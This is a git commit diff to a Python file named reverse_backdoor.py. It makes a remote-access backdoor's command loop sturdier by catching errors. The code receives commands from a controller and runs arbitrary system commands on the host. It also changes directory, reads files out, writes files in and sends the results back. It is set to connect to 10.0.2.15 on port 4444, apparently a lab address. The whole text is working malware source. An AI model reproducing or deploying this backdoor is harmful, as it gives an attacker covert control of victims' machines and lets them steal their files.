71965cda52b475d5f1983a6fa6466553bd23e872
my9143434 <my9143434@gmail.com>
2019-07-29 15:37:43 -0700

    Add files via upload

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -42,17 +42,20 @@ class Backdoor:
 	def run(self):
 		while True:
 			command = self.reliable_receive()
-			if command[0] == "exit":
-				self.connection.close()
-				exit()
-			elif command[0] == "cd" and len(command) > 1:
-				command_result = self.change_working_directory_to(command[1])
-			elif command[0] == "download":
-				command_result = self.read_file(command[1])
-			elif command[0] == "upload":
-				command_result = self.write_file(command[1], command[2])
-			else:
-				command_result = self.execute_system_command(command) 
+			try:
+				if command[0] == "exit":
+					self.connection.close()
+					exit()
+				elif command[0] == "cd" and len(command) > 1:
+					command_result = self.change_working_directory_to(command[1])
+				elif command[0] == "download":
+					command_result = self.read_file(command[1])
+				elif command[0] == "upload":
+					command_result = self.write_file(command[1], command[2])
+				else:
+					command_result = self.execute_system_command(command) 
+			except Exception:
+				command_result = "[-] Error during command execution. (b)"
 			self.reliable_send(command_result)
 		
 my_backdoor = Backdoor("10.0.2.15", 4444)
